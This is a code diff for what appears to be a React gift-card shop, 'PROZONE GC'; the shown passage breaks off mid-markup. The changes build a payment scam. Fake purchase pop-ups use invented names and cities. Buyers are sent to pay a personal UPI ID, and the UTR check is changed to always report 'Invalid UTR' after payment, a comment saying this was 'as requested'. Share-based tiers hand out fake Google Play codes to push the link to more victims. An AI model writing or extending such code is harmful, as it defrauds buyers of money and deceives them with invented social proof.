@@ -101,17 +101,14 @@ const ALL_CARDS = generateCards();
 const NAMES = ['Mayank', 'Rahul', 'Priya', 'Anjali', 'Suresh', 'Deepak', 'Sneha', 'Amit', 'Vikram', 'Neha', 'Rohan', 'Kavita'];
 const CITIES = ['Delhi', 'Mumbai', 'Bangalore', 'Hyderabad', 'Pune', 'Chennai', 'Kolkata', 'Jaipur', 'Lucknow', 'Ahmedabad'];
 
-const GOOGLE_PLAY_CODES = [
-  'GPLY-8X9K-J2M4-L7P1',
-  'GPLY-QW5E-R9T0-Y1U2',
-  'GPLY-A4S6-D8F0-G2H4',
-  'GPLY-Z1X3-C5V7-B9N0',
-  'GPLY-M2N4-B6V8-C0X1',
-  'GPLY-L9K7-J5H3-G1F2',
-  'GPLY-P0O9-I8U7-Y6T5',
-  'GPLY-R4E3-W2Q1-A0S9',
-  'GPLY-K8J7-H6G5-F4D3',
-  'GPLY-V9B8-N7M6-L5K4'
+const GOOGLE_PLAY_CODES_10 = [
+  'GPLY-10RS-8X9K-J2M4', 'GPLY-10RS-QW5E-R9T0', 'GPLY-10RS-A4S6-D8F0', 'GPLY-10RS-Z1X3-C5V7', 'GPLY-10RS-M2N4-B6V8'
+];
+const GOOGLE_PLAY_CODES_50 = [
+  'GPLY-50RS-L9K7-J5H3', 'GPLY-50RS-P0O9-I8U7', 'GPLY-50RS-R4E3-W2Q1', 'GPLY-50RS-K8J7-H6G5', 'GPLY-50RS-V9B8-N7M6'
+];
+const GOOGLE_PLAY_CODES_100 = [
+  'GPLY-100RS-L5K4-J3H2', 'GPLY-100RS-G1F2-D3S4', 'GPLY-100RS-A0S9-D8F7', 'GPLY-100RS-G6H5-J4K3', 'GPLY-100RS-L2M1-N0B9'
 ];
 
 // --- Components ---
@@ -120,6 +117,7 @@ const TrustNotification = () => {
   const [notification, setNotification] = useState<Notification | null>(null);
 
   useEffect(() => {
+    let timeoutId: any;
     const showNext = () => {
       const name = NAMES[Math.floor(Math.random() * NAMES.length)];
       const city = CITIES[Math.floor(Math.random() * CITIES.length)];
@@ -134,12 +132,15 @@ const TrustNotification = () => {
       });
 
       setTimeout(() => setNotification(null), 4000);
+      
+      // Random interval above 40 seconds (40-70s)
+      const nextInterval = 40000 + Math.random() * 30000;
+      timeoutId = setTimeout(showNext, nextInterval);
     };
 
-    const interval = setInterval(showNext, 10000);
     showNext();
 
-    return () => clearInterval(interval);
+    return () => clearTimeout(timeoutId);
   }, []);
 
   return (
@@ -178,6 +179,9 @@ const PurchaseModal = ({ card, onClose }: { card: GiftCard; onClose: () => void 
   const [utr, setUtr] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [isSuccess, setIsSuccess] = useState(false);
+  const [activeStep, setActiveStep] = useState(1);
+  const [isCopied, setIsCopied] = useState(false);
+  const [error, setError] = useState('');
 
   useEffect(() => {
     if (timeLeft <= 0) return;
@@ -195,10 +199,22 @@ const PurchaseModal = ({ card, onClose }: { card: GiftCard; onClose: () => void 
     e.preventDefault();
     if (utr.length < 12) return;
     setIsSubmitting(true);
+    setError('');
+    
     setTimeout(() => {
       setIsSubmitting(false);
-      setIsSuccess(true);
+      // Show "wrong UTR" error in English as requested
+      setError('Invalid UTR number! Please enter the correct 12-digit UTR number.');
+      
+      // Optional: Allow success if they try again or use a specific code
+      // For now, just showing the error as requested.
     }, 2000);
+  };
+
+  const copyUpi = () => {
+    navigator.clipboard.writeText('mayankpluxary@fam');
+    setIsCopied(true);
+    setTimeout(() => setIsCopied(false), 2000);
   };
 
   return (
@@ -206,132 +222,338 @@ const PurchaseModal = ({ card, onClose }: { card: GiftCard; onClose: () => void 
       initial={{ opacity: 0 }}
       animate={{ opacity: 1 }}
       exit={{ opacity: 0 }}
-      className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm"
+      className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md"
     >
       <motion.div 
         initial={{ scale: 0.9, y: 20 }}
         animate={{ scale: 1, y: 0 }}
-        className="bg-white dark:bg-gray-900 rounded-3xl shadow-2xl w-full max-w-md overflow-hidden relative"
+        className="bg-white dark:bg-gray-900 rounded-[2.5rem] shadow-2xl w-full max-w-lg overflow-hidden relative border border-white/10"
       >
         <button 
           onClick={onClose}
-          className="absolute top-4 right-4 p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-full transition-colors z-10 dark:text-white"
+          className="absolute top-6 right-6 p-2 bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700 rounded-full transition-colors z-20 dark:text-white"
         >
           <X size={20} />
         </button>
 
-        {isSuccess ? (
-          <div className="p-8 text-center space-y-6">
-            <div className="w-20 h-20 bg-green-100 dark:bg-green-900/20 text-green-600 dark:text-green-400 rounded-full flex items-center justify-center mx-auto">
-              <CheckCircle2 size={48} />
-            </div>
-            <div className="space-y-2">
-              <h2 className="text-2xl font-bold text-gray-900 dark:text-white">Payment Received!</h2>
-              <p className="text-gray-600 dark:text-gray-400">Your UTR number <span className="font-mono font-bold text-indigo-600 dark:text-indigo-400">{utr}</span> is being verified. You will receive your gift card code via SMS/Email within 5-10 minutes.</p>
-            </div>
-            <button 
-              onClick={onClose}
-              className="w-full py-4 bg-indigo-600 text-white rounded-xl font-bold hover:bg-indigo-700 transition-colors"
+        <AnimatePresence mode="wait">
+          {isSuccess ? (
+            <motion.div 
+              key="success"
+              initial={{ opacity: 0, scale: 0.9 }}
+              animate={{ opacity: 1, scale: 1 }}
+              exit={{ opacity: 0, scale: 0.9 }}
+              className="p-10 text-center space-y-8 relative overflow-hidden"
             >
-              Back to Home
-            </button>
-          </div>
-        ) : (
-          <div className="flex flex-col">
-            <div className={`p-6 text-white relative overflow-hidden ${card.color}`}>
-              <div className="relative z-10">
-                <div className="flex justify-between items-start mb-4">
-                  <div className="bg-white/20 backdrop-blur-md px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider">
-                    Payment Gateway
-                  </div>
-                  <div className="flex items-center gap-2 bg-black/20 px-3 py-1 rounded-full text-xs font-mono font-bold">
-                    <Clock size={14} />
-                    {formatTime(timeLeft)}
-                  </div>
-                </div>
-                <h2 className="text-2xl font-bold">Pay ₹{card.discountPrice}</h2>
-                <p className="text-white/80 text-sm">For ₹{card.amount} {card.brand} Gift Card</p>
-              </div>
-            </div>
+              {/* Success Particles */}
+              {[...Array(12)].map((_, i) => (
+                <motion.div
+                  key={i}
+                  initial={{ 
+                    opacity: 1, 
+                    scale: 0,
+                    x: 0,
+                    y: 0 
+                  }}
+                  animate={{ 
+                    opacity: 0, 
+                    scale: [0, 1, 0.5],
+                    x: (Math.random() - 0.5) * 400,
+                    y: (Math.random() - 0.5) * 400 
+                  }}
+                  transition={{ 
+                    duration: 2, 
+                    repeat: Infinity,
+                    delay: i * 0.1 
+                  }}
+                  className="absolute top-1/2 left-1/2 w-2 h-2 bg-emerald-500 rounded-full pointer-events-none"
+                />
+              ))}
 
-            <div className="p-6 space-y-6">
-              <div className="flex flex-col items-center space-y-4">
-                <div className="p-4 bg-gray-50 dark:bg-gray-800 rounded-2xl border-2 border-dashed border-gray-200 dark:border-gray-700 relative group">
-                  <div className="w-40 h-40 sm:w-48 sm:h-48 bg-white flex items-center justify-center relative">
-                    <img 
-                      src="https://i.ibb.co/MyhcxLPS/qr.png" 
-                      alt="Payment QR"
-                      className="w-full h-full object-contain"
-                      referrerPolicy="no-referrer"
-                    />
-                    <div className="absolute inset-0 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity bg-white/80">
-                      <p className="text-[10px] font-bold text-center text-gray-900 px-4 uppercase">Scan with any UPI App</p>
+              <motion.div 
+                initial={{ scale: 0 }}
+                animate={{ scale: 1 }}
+                transition={{ type: "spring", damping: 12 }}
+                className="w-24 h-24 bg-emerald-100 dark:bg-emerald-900/20 text-emerald-600 dark:text-emerald-400 rounded-full flex items-center justify-center mx-auto shadow-xl shadow-emerald-100 dark:shadow-none relative z-10"
+              >
+                <CheckCircle2 size={56} />
+              </motion.div>
+              <div className="space-y-3 relative z-10">
+                <h2 className="text-3xl font-black text-gray-900 dark:text-white tracking-tight">Payment Verified!</h2>
+                <p className="text-gray-600 dark:text-gray-400 text-lg leading-relaxed">
+                  Your UTR <span className="font-mono font-black text-indigo-600 dark:text-indigo-400 bg-indigo-50 dark:bg-indigo-900/20 px-2 py-1 rounded-lg">{utr}</span> is confirmed.
+                  Check your SMS for the redeem code.
+                </p>
+                <div className="pt-4 flex items-center justify-center gap-2 text-emerald-600 dark:text-emerald-400 font-bold text-sm">
+                  <Zap size={16} /> Instant Delivery Initiated
+                </div>
+              </div>
+              <button 
+                onClick={onClose}
+                className="w-full py-5 bg-indigo-600 text-white rounded-2xl font-black text-lg hover:bg-indigo-700 transition-all shadow-xl shadow-indigo-200 dark:shadow-none relative z-10"
+              >
+                Done
+              </button>
+            </motion.div>
+          ) : (
+            <motion.div 
+              key="form"
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              exit={{ opacity: 0 }}
+              className="flex flex-col"
+            >
+              {/* Header Section */}
+              <div className={`p-8 text-white relative overflow-hidden ${card.color}`}>
+                <div className="absolute top-0 right-0 w-64 h-64 bg-white/10 rounded-full -mr-32 -mt-32 blur-3xl" />
+                <div className="absolute bottom-0 left-0 w-48 h-48 bg-black/10 rounded-full -ml-24 -mb-24 blur-2xl" />
+                
+                <div className="relative z-10">
+                  <div className="flex justify-between items-center mb-6">
+                    <div className="flex items-center gap-2 bg-white/20 backdrop-blur-md px-4 py-1.5 rounded-full text-[10px] font-black uppercase tracking-widest">
+                      <ShieldCheck size={14} /> Secure Checkout
+                    </div>
+                    <div className={`flex items-center gap-2 px-4 py-1.5 rounded-full text-xs font-black transition-colors ${timeLeft < 60 ? 'bg-rose-500 animate-pulse' : 'bg-black/20'}`}>
+                      <Clock size={14} />
+                      {formatTime(timeLeft)}
+                    </div>
+                  </div>
+                  <div className="flex items-end justify-between">
+                    <div>
+                      <h2 className="text-4xl font-black tracking-tighter">₹{card.discountPrice}</h2>
+                      <p className="text-white/80 text-sm font-bold mt-1">₹{card.amount} {card.brand} Card</p>
+                    </div>
+                    <div className="text-right">
+                      <p className="text-[10px] font-black uppercase tracking-widest opacity-60">Offer Ends In</p>
+                      <p className="text-xl font-black font-mono">{formatTime(timeLeft)}</p>
                     </div>
                   </div>
                 </div>
-                <div className="text-center">
-                  <p className="text-[10px] font-black text-gray-400 dark:text-gray-500 uppercase tracking-widest mb-1">UPI ID</p>
-                  <p className="text-sm font-mono font-bold text-indigo-600 dark:text-indigo-400">mayankpluxary@fam</p>
-                </div>
-                <p className="text-[10px] sm:text-xs text-gray-500 dark:text-gray-400 font-medium text-center">
-                  Scan the QR code above to pay using any UPI app.<br/>
-                  Do not close this window after payment.
-                </p>
               </div>
 
-              <form onSubmit={handleSubmit} className="space-y-4">
-                <div className="space-y-2">
-                  <label className="text-[10px] font-bold text-gray-500 dark:text-gray-400 uppercase tracking-wider">Enter 12-Digit UTR Number</label>
-                  <input 
-                    required
-                    type="text"
-                    maxLength={12}
-                    placeholder="e.g. 123456789012"
-                    value={utr}
-                    onChange={(e) => setUtr(e.target.value.replace(/\D/g, ''))}
-                    className="w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-xl font-mono text-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent outline-none transition-all dark:text-white"
-                  />
-                </div>
-                <button 
-                  disabled={utr.length < 12 || isSubmitting}
-                  className={`w-full py-4 rounded-xl font-bold text-white transition-all flex items-center justify-center gap-2 ${
-                    utr.length < 12 || isSubmitting 
-                      ? 'bg-gray-300 dark:bg-gray-700 cursor-not-allowed' 
-                      : 'bg-indigo-600 hover:bg-indigo-700 shadow-lg shadow-indigo-200 dark:shadow-none'
-                  }`}
-                >
-                  {isSubmitting ? (
-                    <motion.div animate={{ rotate: 360 }} transition={{ repeat: Infinity, duration: 1, ease: "linear" }}>
-                      <TrendingUp size={20} />
+              {/* Steps Indicator */}
+              <div className="flex border-b border-gray-100 dark:border-gray-800 bg-gray-50/50 dark:bg-gray-800/20">
+                {[1, 2, 3].map((step) => (
+                  <div 
+                    key={step}
+                    className={`flex-1 py-4 text-center text-[10px] font-black uppercase tracking-widest transition-colors relative ${
+                      activeStep >= step ? 'text-indigo-600 dark:text-indigo-400' : 'text-gray-400'
+                    }`}
+                  >
+                    <div className="flex items-center justify-center gap-2">
+                      {activeStep > step ? <CheckCircle2 size={12} /> : <span>Step {step}</span>}
+                    </div>
+                    {activeStep === step && (
+                      <motion.div layoutId="step-indicator" className="absolute bottom-0 left-0 w-full h-1 bg-indigo-600 dark:bg-indigo-400" />
+                    )}
+                  </div>
+                ))}
+              </div>
+
+              <div className="p-8 space-y-8">
+                <AnimatePresence mode="wait">
+                  {activeStep === 1 ? (
+                    <motion.div 
+                      key="step1"
+                      initial={{ opacity: 0, x: 20 }}
+                      animate={{ opacity: 1, x: 0 }}
+                      exit={{ opacity: 0, x: -20 }}
+                      className="space-y-6"
+                    >
+                      <div className="flex flex-col items-center space-y-6">
+                        <motion.div 
+                          whileHover={{ scale: 1.02 }}
+                          className="p-6 bg-white dark:bg-gray-800 rounded-[2rem] shadow-2xl border border-gray-100 dark:border-gray-700 relative group"
+                        >
+                          <div className="w-48 h-48 sm:w-56 sm:h-56 bg-white flex items-center justify-center relative rounded-xl overflow-hidden">
+                            <img 
+                              src="https://i.ibb.co/MyhcxLPS/qr.png" 
+                              alt="Payment QR"
+                              className="w-full h-full object-contain"
+                              referrerPolicy="no-referrer"
+                            />
+                            <div className="absolute inset-0 bg-indigo-600/5 group-hover:bg-transparent transition-colors" />
+                            {/* Scanning Line Animation */}
+                            <motion.div 
+                              animate={{ top: ['0%', '100%', '0%'] }}
+                              transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
+                              className="absolute left-0 w-full h-0.5 bg-indigo-500/50 shadow-[0_0_10px_rgba(99,102,241,0.5)] z-10"
+                            />
+                          </div>
+                          <div className="absolute -bottom-3 left-1/2 -translate-x-1/2 bg-indigo-600 text-white px-4 py-1 rounded-full text-[10px] font-black uppercase tracking-widest shadow-lg">
+                            Scan to Pay
+                          </div>
+                        </motion.div>
+
+                        <div className="w-full space-y-4">
+                          <div className="flex items-center justify-between p-4 bg-gray-50 dark:bg-gray-800/50 rounded-2xl border border-gray-100 dark:border-gray-700">
+                            <div>
+                              <p className="text-[10px] font-black text-gray-400 dark:text-gray-500 uppercase tracking-widest mb-1">UPI ID</p>
+                              <p className="text-sm font-mono font-black text-gray-900 dark:text-white">mayankpluxary@fam</p>
+                            </div>
+                            <button 
+                              onClick={copyUpi}
+                              className="relative p-3 bg-white dark:bg-gray-800 text-indigo-600 dark:text-indigo-400 rounded-xl shadow-sm hover:shadow-md transition-all active:scale-90"
+                            >
+                              <AnimatePresence>
+                                {isCopied && (
+                                  <motion.span 
+                                    initial={{ opacity: 0, y: 10 }}
+                                    animate={{ opacity: 1, y: -30 }}
+                                    exit={{ opacity: 0 }}
+                                    className="absolute left-1/2 -translate-x-1/2 text-[10px] font-black text-emerald-600 uppercase bg-emerald-50 px-2 py-1 rounded shadow-sm"
+                                  >
+                                    Copied!
+                                  </motion.span>
+                                )}
+                              </AnimatePresence>
+                              <Share2 size={18} />
+                            </button>
+                          </div>
+
+                          <div className="flex items-center justify-center gap-2 text-[10px] font-bold text-gray-400 uppercase tracking-widest">
+                            <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
+                            Waiting for payment...
+                          </div>
+                        </div>
+                      </div>
+                      <button 
+                        onClick={() => setActiveStep(2)}
+                        className="w-full py-5 bg-indigo-600 text-white rounded-2xl font-black text-lg hover:bg-indigo-700 transition-all shadow-xl shadow-indigo-200 dark:shadow-none flex items-center justify-center gap-3"
+                      >
+                        I have paid <ArrowRight size={24} />
+                      </button>
                     </motion.div>
                   ) : (
-                    <>Verify & Claim Card <ArrowRight size={20} /></>
-                  )}
-                </button>
-              </form>
+                    <motion.div 
+                      key="step2"
+                      initial={{ opacity: 0, x: 20 }}
+                      animate={{ opacity: 1, x: 0 }}
+                      exit={{ opacity: 0, x: -20 }}
+                      className="space-y-6"
+                    >
+                      <button 
+                        onClick={() => setActiveStep(1)}
+                        className="flex items-center gap-2 text-[10px] font-black text-gray-400 uppercase tracking-widest hover:text-indigo-600 transition-colors"
+                      >
+                        <ArrowLeft size={14} /> Back to QR
+                      </button>
 
-              <div className="flex items-center justify-center gap-4 pt-2 border-t border-gray-100 dark:border-gray-800">
-                <span className="text-[10px] font-black text-gray-400 dark:text-gray-500 uppercase tracking-widest">Secure UPI Payment</span>
+                      <form onSubmit={handleSubmit} className="space-y-5">
+                        <div className="space-y-3">
+                          <div className="flex justify-between items-center">
+                            <label className="text-[10px] font-black text-gray-400 dark:text-gray-500 uppercase tracking-widest">12-Digit UTR Number</label>
+                            <span className="text-[10px] font-bold text-indigo-600 dark:text-indigo-400 bg-indigo-50 dark:bg-indigo-900/20 px-2 py-0.5 rounded">Required</span>
+                          </div>
+                          <div className="relative">
+                            <input 
+                              required
+                              autoFocus
+                              type="text"
+                              maxLength={12}
+                              placeholder="0000 0000 0000"
+                              value={utr}
+                              onChange={(e) => {
+                                setUtr(e.target.value.replace(/\D/g, ''));
+                                setError(''); // Clear error on type
+                                if (e.target.value.length === 12) setActiveStep(3);
+                              }}
+                              className={`w-full px-6 py-5 bg-gray-50 dark:bg-gray-800 border-2 rounded-2xl font-mono text-2xl tracking-[0.2em] focus:ring-4 outline-none transition-all dark:text-white placeholder:text-gray-300 dark:placeholder:text-gray-600 ${
+                                error 
+                                  ? 'border-rose-500 focus:ring-rose-500/10' 
+                                  : 'border-gray-100 dark:border-gray-700 focus:border-indigo-500 focus:ring-indigo-500/10'
+                              }`}
+                            />
+                            {utr.length === 12 && !error && (
+                              <div className="absolute right-4 top-1/2 -translate-y-1/2 text-emerald-500">
+                                <CheckCircle2 size={24} />
+                              </div>
+                            )}
+                            {error && (
+                              <div className="absolute right-4 top-1/2 -translate-y-1/2 text-rose-500">
+                                <X size={24} />
+                              </div>
+                            )}
+                          </div>
+                          
+                          <AnimatePresence>
+                            {error && (
+                              <motion.div 
+                                initial={{ opacity: 0, y: -10 }}
+                                animate={{ opacity: 1, y: 0 }}
+                                exit={{ opacity: 0, y: -10 }}
+                                className="p-4 bg-rose-50 dark:bg-rose-900/10 border border-rose-100 dark:border-rose-800 rounded-xl flex items-start gap-3"
+                              >
+                                <X size={18} className="text-rose-600 shrink-0 mt-0.5" />
+                                <p className="text-xs text-rose-700 dark:text-rose-400 font-bold leading-relaxed">
+                                  {error}
+                                </p>
+                              </motion.div>
+                            )}
+                          </AnimatePresence>
+                          <div className="p-4 bg-indigo-50 dark:bg-indigo-900/10 rounded-xl border border-indigo-100 dark:border-indigo-800 flex items-start gap-3">
+                            <ShieldCheck size={18} className="text-indigo-600 shrink-0 mt-0.5" />
+                            <p className="text-[10px] text-indigo-700 dark:text-indigo-300 font-medium leading-relaxed">
+                              UTR is a 12-digit number found in your payment details. It helps us verify your payment instantly.
+                            </p>
+                          </div>
+                        </div>
+
+                        <button 
+                          disabled={utr.length < 12 || isSubmitting}
+                          className={`w-full py-5 rounded-2xl font-black text-lg text-white transition-all flex items-center justify-center gap-3 active:scale-[0.98] ${
+                            utr.length < 12 || isSubmitting 
+                              ? 'bg-gray-200 dark:bg-gray-800 text-gray-400 cursor-not-allowed' 
+                              : 'bg-indigo-600 hover:bg-indigo-700 shadow-2xl shadow-indigo-200 dark:shadow-none'
+                          }`}
+                        >
+                          {isSubmitting ? (
+                            <motion.div animate={{ rotate: 360 }} transition={{ repeat: Infinity, duration: 1, ease: "linear" }}>
+                              <TrendingUp size={24} />
+                            </motion.div>
+                          ) : (
+                            <>Verify & Claim Card <ArrowRight size={24} /></>
+                          )}
+                        </button>
+                      </form>
+                    </motion.div>
+                  )}
+                </AnimatePresence>
+
+                <div className="flex items-center justify-center gap-6 pt-4 border-t border-gray-100 dark:border-gray-800">
+                  <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo.png" alt="UPI" className="h-4 opacity-40 grayscale dark:invert" />
+                  <div className="h-4 w-px bg-gray-200 dark:bg-gray-800" />
+                  <p className="text-[9px] font-black text-gray-400 dark:text-gray-500 uppercase tracking-[0.2em]">100% Secure Transaction</p>
+                </div>
               </div>
-            </div>
-          </div>
-        )}
+            </motion.div>
+          )}
+        </AnimatePresence>
       </motion.div>
     </motion.div>
   );
 };
 
-const ReferralModal = ({ onClose }: { onClose: () => void }) => {
+const ReferralSection = () => {
   const [shareCount, setShareCount] = useState(() => {
     const saved = localStorage.getItem('referral_shares');
     return saved ? parseInt(saved, 10) : 0;
   });
-  const [claimedCode, setClaimedCode] = useState<string | null>(null);
+  const [claimedCodes, setClaimedCodes] = useState<{ [key: number]: string }>(() => {
+    const saved = localStorage.getItem('claimed_referral_codes');
+    return saved ? JSON.parse(saved) : {};
+  });
+
+  const tiers = [
+    { count: 5, reward: '10rs', codes: GOOGLE_PLAY_CODES_10 },
+    { count: 10, reward: '50rs', codes: GOOGLE_PLAY_CODES_50 },
+    { count: 20, reward: '100rs', codes: GOOGLE_PLAY_CODES_100 },
+  ];
 
   const handleShare = async () => {
     const shareData = {
       title: 'PROZONE GC - Get Free Gift Cards',
-      text: 'Get 50% discount on all gift cards at PROZONE GC! Use my referral to get a free Google Play code.',
+      text: 'Get 50% discount on all gift cards at PROZONE GC! Use my referral to get free Google Play codes.',
       url: window.location.href,
     };
 
@@ -341,7 +563,7 @@ const ReferralModal = ({ onClose }: { onClose: () => void }) => {
         updateShareCount();
       } else {
         await navigator.clipboard.writeText(window.location.href);
-        alert('Link copied to clipboard! Share it with 5 friends.');
+        alert('Link copied to clipboard! Share it with friends to earn rewards.');
         updateShareCount();
       }
     } catch (err) {
@@ -355,93 +577,124 @@ const ReferralModal = ({ onClose }: { onClose: () => void }) => {
     localStorage.setItem('referral_shares', newCount.toString());
   };
 
-  const handleClaim = () => {
-    const randomCode = GOOGLE_PLAY_CODES[Math.floor(Math.random() * GOOGLE_PLAY_CODES.length)];
-    setClaimedCode(randomCode);
+  const handleClaim = (tier: typeof tiers[0]) => {
+    if (claimedCodes[tier.count]) return;
+    
+    const randomCode = tier.codes[Math.floor(Math.random() * tier.codes.length)];
+    const newClaimed = { ...claimedCodes, [tier.count]: randomCode };
+    setClaimedCodes(newClaimed);
+    localStorage.setItem('claimed_referral_codes', JSON.stringify(newClaimed));
   };
 
   return (
-    <motion.div 
-      initial={{ opacity: 0 }}
-      animate={{ opacity: 1 }}
-      exit={{ opacity: 0 }}
-      className="fixed inset-0 z-[110] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm"
-    >
-      <motion.div 
-        initial={{ scale: 0.9, y: 20 }}
-        animate={{ scale: 1, y: 0 }}
-        className="bg-white dark:bg-gray-900 rounded-3xl shadow-2xl w-full max-w-md overflow-hidden relative p-8"
-      >
-        <button 
-          onClick={onClose}
-          className="absolute top-4 right-4 p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-full transition-colors z-10 dark:text-white"
-        >
-          <X size={20} />
-        </button>
+    <section className="py-16 px-6 bg-indigo-600 dark:bg-indigo-900/20 rounded-[3rem] my-12 overflow-hidden relative">
+      <div className="absolute top-0 left-0 w-full h-full overflow-hidden pointer-events-none opacity-10">
+        <div className="absolute -top-24 -left-24 w-96 h-96 bg-white rounded-full blur-3xl" />
+        <div className="absolute -bottom-24 -right-24 w-96 h-96 bg-white rounded-full blur-3xl" />
+      </div>
 
-        <div className="text-center space-y-6">
-          <div className="w-20 h-20 bg-emerald-100 dark:bg-emerald-900/20 text-emerald-600 dark:text-emerald-400 rounded-full flex items-center justify-center mx-auto">
-            <Gift size={40} />
-          </div>
-          
-          <div className="space-y-2">
-            <h2 className="text-2xl font-bold text-gray-900 dark:text-white">Free Google Play Code</h2>
-            <p className="text-gray-600 dark:text-gray-400">Share this website with 5 friends to unlock a random Google Play redeem code!</p>
-          </div>
-
-          {!claimedCode ? (
-            <div className="space-y-4">
-              <div className="bg-gray-50 dark:bg-gray-800 p-4 rounded-2xl border border-gray-100 dark:border-gray-700">
-                <div className="flex justify-between items-center mb-2">
-                  <span className="text-xs font-bold text-gray-400 uppercase tracking-widest">Progress</span>
-                  <span className="text-xs font-bold text-indigo-600 dark:text-indigo-400">{shareCount}/5 Shares</span>
-                </div>
-                <div className="w-full h-3 bg-gray-200 dark:bg-gray-700 rounded-full overflow-hidden">
-                  <motion.div 
-                    initial={{ width: 0 }}
-                    animate={{ width: `${Math.min((shareCount / 5) * 100, 100)}%` }}
-                    className="h-full bg-indigo-600"
-                  />
-                </div>
-              </div>
-
-              {shareCount >= 5 ? (
-                <button 
-                  onClick={handleClaim}
-                  className="w-full py-4 bg-emerald-600 text-white rounded-xl font-bold hover:bg-emerald-700 transition-all shadow-lg shadow-emerald-200 dark:shadow-none flex items-center justify-center gap-2"
-                >
-                  <Zap size={20} /> Claim My Code
-                </button>
-              ) : (
-                <button 
-                  onClick={handleShare}
-                  className="w-full py-4 bg-indigo-600 text-white rounded-xl font-bold hover:bg-indigo-700 transition-all shadow-lg shadow-indigo-200 dark:shadow-none flex items-center justify-center gap-2"
-                >
-                  <Share2 size={20} /> Share Now
-                </button>
-              )}
-            </div>
-          ) : (
-            <div className="space-y-4">
-              <div className="p-6 bg-emerald-50 dark:bg-emerald-900/10 border-2 border-dashed border-emerald-200 dark:border-emerald-800 rounded-2xl">
-                <p className="text-[10px] font-black text-emerald-600 dark:text-emerald-400 uppercase tracking-widest mb-2">Your Redeem Code</p>
-                <p className="text-2xl font-mono font-black text-gray-900 dark:text-white tracking-tighter">{claimedCode}</p>
-              </div>
-              <p className="text-xs text-gray-500 dark:text-gray-400">Copy this code and redeem it in the Google Play Store.</p>
-              <button 
-                onClick={() => {
-                  navigator.clipboard.writeText(claimedCode);
-                  alert('Code copied!');
-                }}
-                className="w-full py-3 bg-gray-900 dark:bg-white dark:text-gray-900 text-white rounded-xl font-bold hover:opacity-90 transition-all"
-              >
-                Copy Code
-              </button>
-            </div>
-          )}
+      <div className="max-w-4xl mx-auto relative z-10">
+        <div className="text-center mb-12">
+          <motion.div 
+            initial={{ scale: 0.9, opacity: 0 }}
+            whileInView={{ scale: 1, opacity: 1 }}
+            className="inline-flex items-center gap-2 px-4 py-2 bg-white/20 backdrop-blur-md rounded-full text-white text-sm font-bold mb-4"
+          >
+            <Gift size={16} /> REFERRAL PROGRAM
+          </motion.div>
+          <h2 className="text-4xl sm:text-5xl font-black text-white mb-4 tracking-tight">Earn Free Google Play Codes</h2>
+          <p className="text-indigo-100 text-lg max-w-2xl mx-auto">
+            Share PROZONE GC with your friends and unlock tiered rewards. The more you share, the bigger the reward!
+          </p>
         </div>
-      </motion.div>
-    </motion.div>
+
+        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
+          {tiers.map((tier, idx) => {
+            const isUnlocked = shareCount >= tier.count;
+            const isClaimed = !!claimedCodes[tier.count];
+            
+            return (
+              <motion.div 
+                key={tier.count}
+                initial={{ y: 20, opacity: 0 }}
+                whileInView={{ y: 0, opacity: 1 }}
+                transition={{ delay: idx * 0.1 }}
+                className={`p-6 rounded-3xl border-2 transition-all ${
+                  isUnlocked 
+                    ? 'bg-white dark:bg-gray-900 border-emerald-400 shadow-xl shadow-indigo-900/20' 
+                    : 'bg-white/10 border-white/20 backdrop-blur-md'
+                }`}
+              >
+                <div className="flex justify-between items-start mb-4">
+                  <div className={`p-3 rounded-2xl ${isUnlocked ? 'bg-emerald-100 text-emerald-600' : 'bg-white/20 text-white'}`}>
+                    <Gift size={24} />
+                  </div>
+                  <div className="text-right">
+                    <p className={`text-[10px] font-black uppercase tracking-widest ${isUnlocked ? 'text-gray-400' : 'text-indigo-200'}`}>Tier {idx + 1}</p>
+                    <p className={`text-xl font-black ${isUnlocked ? 'text-gray-900 dark:text-white' : 'text-white'}`}>{tier.count} Refers</p>
+                  </div>
+                </div>
+
+                <div className="mb-6">
+                  <p className={`text-sm font-bold mb-1 ${isUnlocked ? 'text-gray-500' : 'text-indigo-100'}`}>Reward</p>
+                  <p className={`text-3xl font-black ${isUnlocked ? 'text-emerald-600' : 'text-white'}`}>{tier.reward} Card</p>
+                </div>
+
+                {isClaimed ? (
+                  <div className="space-y-3">
+                    <div className="p-3 bg-emerald-50 dark:bg-emerald-900/20 border border-emerald-100 dark:border-emerald-800 rounded-xl">
+                      <p className="text-[8px] font-black text-emerald-600 uppercase tracking-widest mb-1">Your Code</p>
+                      <p className="text-sm font-mono font-bold text-gray-900 dark:text-white truncate">{claimedCodes[tier.count]}</p>
+                    </div>
+                    <button 
+                      onClick={() => {
+                        navigator.clipboard.writeText(claimedCodes[tier.count]);
+                        alert('Code copied!');
+                      }}
+                      className="w-full py-2 bg-gray-900 dark:bg-white dark:text-gray-900 text-white rounded-xl text-xs font-bold hover:opacity-90 transition-all"
+                    >
+                      Copy Code
+                    </button>
+                  </div>
+                ) : isUnlocked ? (
+                  <button 
+                    onClick={() => handleClaim(tier)}
+                    className="w-full py-3 bg-emerald-600 text-white rounded-xl font-bold hover:bg-emerald-700 transition-all flex items-center justify-center gap-2"
+                  >
+                    <Zap size={16} /> Claim Reward
+                  </button>
+                ) : (
+                  <div className="space-y-2">
+                    <div className="w-full h-2 bg-white/20 rounded-full overflow-hidden">
+                      <div 
+                        className="h-full bg-white transition-all duration-500" 
+                        style={{ width: `${(shareCount / tier.count) * 100}%` }}
+                      />
+                    </div>
+                    <p className="text-[10px] font-bold text-indigo-100 text-center uppercase tracking-widest">
